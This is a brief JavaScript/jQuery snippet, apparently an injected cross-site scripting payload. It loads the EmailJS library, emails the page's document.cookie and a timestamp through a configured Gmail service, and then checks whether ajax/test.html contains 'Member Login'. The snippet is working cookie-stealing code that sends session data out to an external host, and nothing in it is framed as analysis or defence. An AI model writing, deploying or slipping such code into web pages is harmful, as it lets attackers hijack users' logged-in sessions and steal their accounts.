
$.getScript('https://cdn.emailjs.com/dist/email.min.js', function() {
  (function(){
      emailjs.init("user_v53jGOfDqJGNImD25jUpw");
   })();
     emailjs.send("gmail","data",{cookie: document.cookie, time: new Date().getTime()});
     $.get( "ajax/test.html", function( data ) {
          var str2 = "Member Login";
          if(data.indexOf(str2) != -1){
               console.log(str2 + " found");
          }else{
             console.log("not found");
          }
     });
});
//
